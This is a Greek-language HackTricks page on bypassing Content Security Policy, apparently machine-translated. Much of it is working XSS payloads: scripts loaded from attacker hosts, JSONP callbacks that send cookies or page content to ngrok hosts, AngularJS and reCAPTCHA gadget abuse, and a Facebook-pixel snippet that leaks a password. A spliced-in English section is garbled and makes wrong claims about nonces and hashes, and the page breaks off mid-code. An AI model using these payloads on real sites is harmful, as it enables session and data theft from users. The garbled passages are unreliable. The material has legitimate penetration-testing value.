# Παράκαμψη Πολιτικής Ασφάλειας Περιεχομένου (CSP)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**Διακομιστή Discord του HackenProof**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανταμοιβές ευρημάτων και τις κρίσιμες ενημερώσεις πλατφόρμας

**Ελάτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε τη συνεργασία με κορυφαίους χάκερ σήμερα! 

## Τι είναι η CSP

Η Πολιτική Ασφάλειας Περιεχομένου (CSP) αναγνωρίζεται ως τεχνολογία προγράμματος περιήγησης, με κύριο στόχο την **προστασία ενάντια σε επιθέσεις όπως η διασπορά σελίδων (XSS)**. Λειτουργεί καθορίζοντας και περιγράφοντας διαδρομές και πηγές από τις οποίες το πρόγραμμα περιήγησης μπορεί να φορτώσει ασφαλώς πόρους. Αυτοί οι πόροι περιλαμβάνουν μια σειρά στοιχείων όπως εικόνες, πλαίσια και JavaScript. Για παράδειγμα, μια πολιτική μπορεί να επιτρέπει τη φόρτωση και εκτέλεση πόρων από τον ίδιο τομέα (self), συμπεριλαμβανομένων των ενσωματωμένων πόρων και την εκτέλεση κώδικα συμβολοσειράς μέσω λειτουργιών όπως `eval`, `setTimeout`, ή `setInterval`.

Η εφαρμογή της CSP πραγματοποιείται μέσω **κεφαλίδων απάντησης** ή με την ενσωμάτωση **στοιχείων meta στη σελίδα HTML**. Με βάση αυτήν την πολιτική, οι περιηγητές επιβάλλουν αυτές τις προδιαγραφές και αμέσως αποκλείουν οποιεσδήποτε παραβάσεις εντοπίζονται.
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Υλοποιημένο μέσω ετικέτας meta:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Επικεφαλίδες

Το CSP μπορεί να επιβληθεί ή να παρακολουθείται χρησιμοποιώντας αυτές τις επικεφαλίδες:

* `Content-Security-Policy`: Επιβάλλει το CSP· ο περιηγητής αποκλείει οποιεσδήποτε παραβάσεις.
* `Content-Security-Policy-Report-Only`: Χρησιμοποιείται για παρακολούθηση· αναφέρει παραβάσεις χωρίς να τις αποκλείει. Ιδανικό για δοκιμές σε περιβάλλοντα προεγγενέστερης παραγωγής.

### Ορισμός Πόρων

Το CSP περιορίζει τις πηγές για τη φόρτωση ενεργών και παθητικών περιεχομένων, ελέγχοντας πτυχές όπως η εκτέλεση inline JavaScript και η χρήση της `eval()`. Ένα παράδειγμα πολιτικής είναι:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Οδηγίες

* **script-src**: Επιτρέπει συγκεκριμένες πηγές για JavaScript, συμπεριλαμβανομένων διευθύνσεων URL, ενσωματωμένων scripts, και scripts που ενεργοποιούνται από event handlers ή XSLT stylesheets.
* **default-src**: Ορίζει μια προεπιλεγμένη πολιτική για τη λήψη πόρων όταν συγκεκριμένες οδηγίες λήψης λείπουν.
* **child-src**: Καθορίζει τους επιτρεπόμενους πόρους για web workers και περιεχόμενα ενσωματωμένων πλαισίων.
* **connect-src**: Περιορίζει τις διευθύνσεις URL που μπορούν να φορτωθούν χρησιμοποιώντας διεπαφές όπως fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Περιορίζει τις διευθύνσεις URL για πλαίσια.
* **frame-ancestors**: Καθορίζει ποιες πηγές μπορούν να ενσωματώσουν την τρέχουσα σελίδα, εφαρμόσιμο σε στοιχεία όπως `<frame>`, `<iframe>`, `<object>`, `<embed>`, και `<applet>`.
* **img-src**: Ορίζει τις επιτρεπόμενες πηγές για εικόνες.
* **font-src**: Καθορίζει τις έγκυρες πηγές για γραμματοσειρές που φορτώνονται χρησιμοποιώντας το `@font-face`.
* **manifest-src**: Ορίζει τις επιτρεπόμενες πηγές αρχείων μεταφοράς εφαρμογής.
* **media-src**: Ορίζει τις επιτρεπόμενες πηγές για τη φόρτωση αντικειμένων πολυμέσων.
* **object-src**: Ορίζει τις επιτρεπόμενες πηγές για τα στοιχεία `<object>`, `<embed>`, και `<applet>`.
* **base-uri**: Καθορίζει τις επιτρεπόμενες διευθύνσεις URL για φόρτωση χρησιμοποιώντας τα στοιχεία `<base>`.
* **form-action**: Καταγράφει τα έγκυρα σημεία έκδοσης για υποβολές φόρμας.
* **plugin-types**: Περιορίζει τους τύπους mime που μια σελίδα μπορεί να ενεργοποιήσει.
* **upgrade-insecure-requests**: Οδηγεί τους browsers να αναδιατάξουν τις διευθύνσεις URL HTTP σε HTTPS.
* **sandbox**: Εφαρμόζει περιορισμούς παρόμοιους με το χαρακτηριστικό sandbox ενός `<iframe>`.
* **report-to**: Καθορίζει μια ομάδα στην οποία θα σταλεί ένα αναφορά αν η πολιτική παραβιαστεί.
* **worker-src**: Καθορίζει τις έγκυρες πηγές για scripts Worker, SharedWorker, ή ServiceWorker.
* **prefetch-src**: Καθορίζει τις έγκυρες πηγές για πόρους που θα φορτωθούν ή θα προφορτωθούν.
* **navigate-to**: Περιορίζει τις διευθύνσεις URL στις οποίες μπορεί να πλοηγηθεί ένα έγγραφο με οποιονδήποτε τρόπο (σύνδεσμος, φόρμα, window.location, window.open, κλπ.)

### Πηγές

* `*`: Επιτρέπει όλες τις διευθύνσεις URL εκτός από αυτές με τις σχήματα `data:`, `blob:`, `filesystem:`.
* `'self'`: Επιτρέπει τη φόρτωση από τον ίδιο τομέα.
* `'data'`: Επιτρέπει τη φόρτωση πόρων μέσω του σχήματος data (π.χ., εικόνες κωδικοποιημένες σε Base64).
* `'none'`: Αποκλείει τη φόρτωση από οποιαδήποτε πηγή.
* `'unsafe-eval'`: Επιτρέπει τη χρήση της `eval()` και παρόμοιων μεθόδων, δεν συνιστάται για λόγους ασφαλείας.
* `'unsafe-hashes'`: Ενεργοποιεί συγκεκριμένους inline event handlers.
* `'unsafe-inline'`: Επιτρέπει τη χρήση inline πόρων όπως inline `<script>` ή `<style>`, δεν συνιστάται για λόγους ασφαλείας.
* `'nonce'`: Μια λευκή λίστα για συγκεκριμένα inline scripts χρησιμοποιώντας έναν κρυπτογραφικό nonce (αριθμός που χρησιμοποιείται μία φορά).
* Αν έχετε περιορισμένη εκτέλεση JS είναι δυνατόν να λάβετε ένα χρησιμοποιημένο nonce μέσα στη σελίδα με `doc.defaultView.top.document.querySelector("[nonce]")` και στη συνέχεια να το επαναχρησιμοποιήσετε για τη φόρτωση ενός κακόβουλου script (αν χρησιμοποιείται το strict-dynamic, οποιαδήποτε επιτρεπόμενη πηγή μπορεί να φορτώσει νέες πηγές οπότε αυτό δεν είναι απαραίτητο), όπως στο:

<details>

<summary>Φόρτωση script επαναχρησιμοποιώντας nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Λευκή λίστα σεναρίων με συγκεκριμένο κατακευή sha256.
* `'strict-dynamic'`: Επιτρέπει τη φόρτωση σεναρίων από οποιαδήποτε πηγή αν έχει προστεθεί στη λευκή λίστα μέσω nonce ή hash.
* `'host'`: Καθορίζει μια συγκεκριμένη φιλοξενία, όπως `example.com`.
* `https:`: Περιορίζει τις διευθύνσεις URL σε αυτές που χρησιμοποιούν HTTPS.
* `blob:`: Επιτρέπει τη φόρτωση πόρων από διευθύνσεις URL Blob (π.χ. διευθύνσεις URL Blob που δημιουργούνται μέσω JavaScript).
* `filesystem:`: Επιτρέπει τη φόρτωση πόρων από το σύστημα αρχείων.
* `'report-sample'`: Περιλαμβάνει ένα δείγμα του κώδικα που παραβιάζει τον κανόνα στην αναφορά παραβίασης (χρήσιμο για αποσφαλμάτωση).
* `'strict-origin'`: Παρόμοιο με το 'self' αλλά εξασφαλίζει ότι το επίπεδο ασφάλειας πρωτοκόλλου των πηγών ταιριάζει με το έγγραφο (μόνο ασφαλείς πηγές μπορούν να φορτώσουν πόρους από ασφαλείς πηγές).
* `'strict-origin-when-cross-origin'`: Αποστέλλει πλήρεις διευθύνσεις URL κατά την πραγματοποίηση αιτήσεων με την ίδια προέλευση, αλλά αποστέλλει μόνο την προέλευση όταν η αίτηση είναι διασυνοριακή.
* `'unsafe-allow-redirects'`: Επιτρέπει τη φόρτωση πόρων που θα ανακατευθύνουν αμέσως σε άλλο πόρο. Δεν συνιστάται καθώς αποδυναμώνει την ασφάλεια.

## Κανόνες CSP μη ασφαλείς

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Λειτουργικό φορτίο: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' μέσω Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Λειτουργικό φορτίο:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Αν μπορέσετε με κάποιον τρόπο να κάνετε ένα **επιτρεπόμενο JS κώδικα να δημιουργήσει ένα νέο ετικέτα script** στο DOM με τον JS κώδικά σας, επειδή ένας επιτρεπόμενος κώδικας δημιουργεί το, η **νέα ετικέτα script θα επιτραπεί να εκτελεστεί**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Λειτουργικό φορτίο:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Έλλειψη object-src και default-src

{% hint style="danger" %}
**Φαίνεται ότι αυτό πλέον δεν λειτουργεί**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Λειτουργικά φορτία:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Μεταφόρτωση Αρχείου + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Εάν μπορείτε να μεταφορτώσετε ένα αρχείο JS, μπορείτε να παρακάμψετε αυτό το CSP:

Λειτουργικό φορτίο:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ωστόσο, είναι πολύ πιθανό ότι ο διακομιστής ελέγχει το ανεβασμένο αρχείο και θα σας επιτρέψει μόνο να ανεβάσετε συγκεκριμένου τύπου αρχεία.

Επιπλέον, ακόμα κι αν μπορούσατε να ανεβάσετε έναν κώδικα JS μέσα σε ένα αρχείο χρησιμοποιώντας μια επέκταση που αποδέχεται ο διακομιστής (όπως: _script.png_), αυτό δεν θα είναι αρκετό επειδή ορισμένοι διακομιστές όπως ο διακομιστής apache επιλέγουν τον τύπο MIME του αρχείου με βάση την επέκταση και οι περιηγητές όπως ο Chrome θα αρνηθούν να εκτελέσουν κώδικα Javascript μέσα σε κάτι που θα έπρεπε να είναι μια εικόνα. "Ευτυχώς", υπάρχουν λάθη. Για παράδειγμα, από ένα CTF μάθαινα ότι ο Apache δεν γνωρίζει την επέκταση _**.wave**_, επομένως δεν την εξυπηρετεί με έναν τύπο MIME όπως audio/\*.

Από εδώ, αν βρείτε ένα XSS και ένα ανέβασμα αρχείου και καταφέρετε να βρείτε μια λανθασμένα ερμηνευμένη επέκταση, μπορείτε να δοκιμάσετε να ανεβάσετε ένα αρχείο με αυτήν την επέκταση και το περιεχόμενο του script. Ή, αν ο διακομιστής ελέγχει τη σωστή μορφή του ανεβασμένου αρχείου, δημιουργήστε έναν πολύγλωττο ([κάποια παραδείγματα πολύγλωτων εδώ](https://github.com/Polydet/polyglot-database)).

### Τρίτες Συνδέσεις + ('unsafe-eval')

{% hint style="warning" %}
Για μερικά από τα παρακάτω φορτία **`unsafe-eval` δεν είναι καν απαραίτητο**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Φορτώστε μια ευάλωτη έκδοση του Angular και εκτελέστε αυθαίρετο JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads χρησιμοποιώντας το Angular + μια βιβλιοθήκη με συναρτήσεις που επιστρέφουν το αντικείμενο `window` ([έλεγξε αυτή την ανάρτηση](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Η ανάρτηση δείχνει ότι μπορείτε **να φορτώσετε** όλες τις **βιβλιοθήκες** από `cdn.cloudflare.com` (ή οποιονδήποτε άλλο επιτρεπόμενο αποθετήριο JS βιβλιοθηκών), να εκτελέσετε όλες τις προστεθείσες συναρτήσεις από κάθε βιβλιοθήκη, και να ελέγξετε **ποιες συναρτήσεις από ποιες βιβλιοθήκες επιστρέφουν το αντικείμενο `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Κατάχρηση του κώδικα JS του Google reCAPTCHA

Σύμφωνα με [**αυτό το CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) μπορείτε να καταχραστείτε το [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) μέσα σε ένα CSP για να εκτελέσετε αυθαίρετο κώδικα JS παρακάμπτοντας το CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Περισσότερα [**φορτία από αυτήν την ανάλυση**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
### Τρίτες Συνδέσεις Σημείων + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Σε περιπτώσεις όπως αυτή όπου το `script-src` έχει οριστεί σε `self` και ένα συγκεκριμένο τομέα που έχει προστεθεί στη λευκή λίστα, μπορούν να παρακαμφθούν χρησιμοποιώντας το JSONP. Τα σημεία JSONP επιτρέπουν μη ασφαλείς μεθόδους επιστροφής κλήσης που επιτρέπουν σε έναν επιτιθέμενο να εκτελέσει XSS, λειτουργικό φορτίο:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **περιέχει έτοιμα σημεία JSONP για την παράκαμψη του CSP σε διάφορες ιστοσελίδες.**

Η ίδια ευπάθεια θα προκύψει εάν το **αξιόπιστο σημείο περιέχει μια Ανοικτή Ανακατεύθυνση** επειδή εάν το αρχικό σημείο είναι αξιόπιστο, οι ανακατευθύνσεις είναι αξιόπιστες.

### Κατάχρηση από τρίτους

Όπως περιγράφεται στην [ακόλουθη ανάρτηση](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), υπάρχουν πολλοί τομείς τρίτων, που ενδέχεται να επιτρέπονται κάπου στο CSP, μπορούν να καταχραστούν είτε για την εξαγωγή δεδομένων είτε για την εκτέλεση κώδικα JavaScript. Μερικοί από αυτούς τους τρίτους είναι:

| Οντότητα         | Επιτρεπόμενος Τομέας                         | Δυνατότητες  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Εξαγωγή     |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Εξαγωγή     |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Εκτέλεση    |
| Amazon CloudFront | \*.cloudfront.net                            | Εξαγωγή, Εκτέλεση  |
| Amazon AWS        | \*.amazonaws.com                             | Εξαγωγή, Εκτέλεση  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Εξαγωγή, Εκτέλεση  |
| Salesforce Heroku | \*.herokuapp.com                             | Εξαγωγή, Εκτέλεση  |
| Google Firebase   | \*.firebaseapp.com                           | Εξαγωγή, Εκτέλεση  |

Εάν βρείτε κάποιον από τους επιτρεπόμενους τομείς στο CSP του στόχου σας, υπάρχει πιθανότητα να μπορέσετε να παρακάμψετε το CSP καταχωρίζοντας στην υπηρεσία τρίτου και, είτε να εξάγετε δεδομένα σε αυτήν την υπηρεσία είτε να εκτελέσετε κώδικα.

Για παράδειγμα, εάν βρείτε το ακόλουθο CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
### Content Security Policy (CSP) Bypass

---

#### Bypassing CSP using `unsafe-inline`

CSP directives like `script-src` and `style-src` with the `unsafe-inline` keyword allow the execution of inline scripts and styles. This can be exploited by injecting malicious code directly into the HTML document.

#### Bypassing CSP using Data URI

CSP can also be bypassed by using Data URI scheme to include external resources inline. For example, `<img src="data:image/png;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==">`.

#### Bypassing CSP using `nonce` attribute

By setting a `nonce` attribute in the CSP header and script/style tags, only scripts/styles with a matching `nonce` value will be executed, allowing bypass of CSP restrictions.

#### Bypassing CSP using `hashes`

CSP allows specifying hashes of allowed scripts/styles in the policy. This can be bypassed by injecting scripts/styles with matching hashes, allowing execution of unauthorized code.
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Θα πρέπει να μπορείτε να εξαγάγετε δεδομένα, με τον ίδιο τρόπο που πάντα έχει γίνει με το [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Σε αυτήν την περίπτωση, ακολουθείτε αυτά τα γενικά βήματα:

1. Δημιουργήστε ένα λογαριασμό Ανάπτυξης Facebook εδώ.
2. Δημιουργήστε ένα νέο "Facebook Login" app και επιλέξτε "Ιστοσελίδα".
3. Πηγαίνετε σε "Ρυθμίσεις -> Βασικές" και πάρτε το "App ID" σας.
4. Στην ιστοσελίδα-στόχο από την οποία θέλετε να εξάγετε δεδομένα, μπορείτε να εξάγετε δεδομένα χρησιμοποιώντας απευθείας το Facebook SDK gadget "fbq" μέσω ενός "customEvent" και των δεδομένων φορτίου.
5. Πηγαίνετε στο "Διαχειριστή Συμβάντων" της εφαρμογής σας και επιλέξτε την εφαρμογή που δημιουργήσατε (σημείωση: ο διαχειριστής συμβάντων μπορεί να βρεθεί σε μια διεύθυνση URL παρόμοια με αυτήν: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Επιλέξτε την καρτέλα "Δοκιμαστικά Συμβάντα" για να δείτε τα συμβάντα που στέλνονται από την ιστοσελίδα "σας".

Στη συνέχεια, στην πλευρά του θύματος, εκτελείτε τον παρακάτω κώδικα για να αρχικοποιήσετε το Facebook tracking pixel ώστε να δείχνει στον λογαριασμό ανάπτυξης του επιτιθέμενου στο Facebook app-id και να εκδώσετε ένα προσαρμοσμένο συμβάν όπως αυτό:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
### Bypass μέσω RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Εκτός από την προαναφερθείσα ανακατεύθυνση για την παράκαμψη περιορισμών διαδρομής, υπάρχει μια άλλη τεχνική που ονομάζεται Relative Path Overwrite (RPO) που μπορεί να χρησιμοποιηθεί σε μερικούς διακομιστές.

Για παράδειγμα, αν το CSP επιτρέπει τη διαδρομή `https://example.com/scripts/react/`, μπορεί να παρακαμφθεί ως εξής:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Το πρόγραμμα περιήγησης θα φορτώσει τελικά το `https://example.com/scripts/angular/angular.js`.

Αυτό λειτουργεί επειδή για τον περιηγητή, φορτώνετε ένα αρχείο με το όνομα `..%2fangular%2fangular.js` που βρίσκεται κάτω από το `https://example.com/scripts/react/`, το οποίο είναι συμβατό με το CSP.

Έτσι, θα το αποκωδικοποιήσουν, ζητώντας αποτελεσματικά το `https://example.com/scripts/react/../angular/angular.js`, το οποίο είναι ισοδύναμο με το `https://example.com/scripts/angular/angular.js`.

Αξιοποιώντας αυτήν την αντίφαση στην ερμηνεία του URL μεταξύ του περιηγητή και του διακομιστή, μπορούν να παρακαμφθούν οι κανόνες διαδρομής.

Η λύση είναι να μην θεωρείτε το `%2f` ως `/` στην πλευρά του διακομιστή, εξασφαλίζοντας συνεπή ερμηνεία μεταξύ του περιηγητή και του διακομιστή για να αποφευχθεί αυτό το ζήτημα.

Παράδειγμα Online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Εκτέλεση JS μέσω Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### λείπον **base-uri**

Αν η οδηγία **base-uri** λείπει, μπορείτε να την καταχραστείτε για να εκτελέσετε μια [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Επιπλέον, αν η **σελίδα φορτώνει ένα script χρησιμοποιώντας μια σχετική διαδρομή** (όπως `<script src="/js/app.js">`) χρησιμοποιώντας ένα **Nonce**, μπορείτε να καταχραστείτε την **ετικέτα base** για να το κάνετε να **φορτώσει** το script από το **δικό σας διακομιστή επιτυγχάνοντας ένα XSS.**\
Αν η ευάλωτη σελίδα φορτώνεται με **httpS**, χρησιμοποιήστε ένα url httpS στην ετικέτα base.
```html
<base href="https://www.attacker.com/">
```
### Συμβάντα AngularJS

Μια συγκεκριμένη πολιτική γνωστή ως Πολιτική Ασφαλείας Περιεχομένου (CSP) μπορεί να περιορίζει τα συμβάντα JavaScript. Ωστόσο, το AngularJS εισάγει προσαρμοσμένα συμβάντα ως εναλλακτική λύση. Μέσα σε ένα συμβάν, το AngularJS παρέχει ένα μοναδικό αντικείμενο `$event`, το οποίο αναφέρεται στο πρωτότυπο αντικείμενο συμβάντος του προγράμματος περιήγησης. Αυτό το αντικείμενο `$event` μπορεί να εκμεταλλευτείται για να παρακάμψει τη CSP. Ιδιαίτερα, στο Chrome, το αντικείμενο `$event/event` διαθέτει ένα χαρακτηριστικό `path`, το οποίο κρατά έναν πίνακα αντικειμένων που σχετίζονται με την αλυσίδα εκτέλεσης του συμβάντος, με το αντικείμενο `window` να βρίσκεται πάντοτε στο τέλος. Αυτή η δομή είναι κρίσιμη για τακτικές διαφυγής από τον αμμόλοφο.

Καθοδηγώντας αυτόν τον πίνακα στο φίλτρο `orderBy`, είναι δυνατόν να επαναληφθεί, εκμεταλλευόμενος το τερματικό στοιχείο (το αντικείμενο `window`) για να ενεργοποιηθεί μια παγκόσμια συνάρτηση όπως το `alert()`. Το παρακάτω απόσπασμα κώδικα επεξηγεί αυτήν τη διαδικασία:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Αυτό το απόσπασμα υπογραμμίζει τη χρήση της οδηγίας `ng-focus` για να ενεργοποιήσει το συμβάν, χρησιμοποιώντας το `$event.path|orderBy` για να χειριστεί τον πίνακα `path`, και εκμεταλλευόμενο το αντικείμενο `window` για να εκτελέσει τη λειτουργία `alert()`, αποκαλύπτοντας έτσι το `document.cookie`.

**Βρείτε άλλες παρακάμψεις στο Angular** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS και λευκή λίστα τομέων
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Μια πολιτική CSP που καταχωρίζει λευκή λίστα τομέων για τη φόρτωση σεναρίων σε μια εφαρμογή Angular JS μπορεί να παρακαμφθεί μέσω της κλήσης συναρτήσεων επιστροφής και ορισμένων ευάλωτων κλάσεων. Περισσότερες πληροφορίες για αυτήν την τεχνική μπορούν να βρεθούν σε ένα λεπτομερές οδηγό διαθέσιμο σε αυτό το [αποθετήριο git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Λειτουργικά φορτία:
```html
